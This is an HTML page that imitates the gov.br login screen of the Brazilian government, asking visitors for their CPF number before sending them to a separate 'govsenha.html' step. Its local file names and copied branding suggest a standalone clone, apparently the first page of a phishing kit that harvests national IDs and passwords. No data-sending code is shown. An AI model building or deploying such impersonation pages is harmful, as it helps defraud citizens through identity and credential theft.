<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>gov.br - Acesso</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Rawline:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="govcpf.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="/src/pages/Login/img/logogov.br.webp" alt="gov.br" class="logo">
            <div class="icons">
                <div class="icon"></div>
                <div class="icon"></div>
            </div>
        </div>

        <div class="login-box">
            <h3>Identifique-se no gov.br com:</h3>

            <div class="input-group">
                <label for="cpf">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-user"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
                    Número do CPF
                </label>
                <p>Digite seu CPF para <span style="font-weight: bold; color: #007bff;">criar</span> ou <span style="font-weight: bold; color: #007bff;">acessar</span> sua conta gov.br</p>
                <input type="text" id="cpf" placeholder="Digite seu CPF" inputmode="numeric" pattern="[0-9]*" maxlength="11">
            </div>

            <a class="btn-continue" href="govsenha.html">Continuar</a>
        </div>
    </div>
</body>
</html>
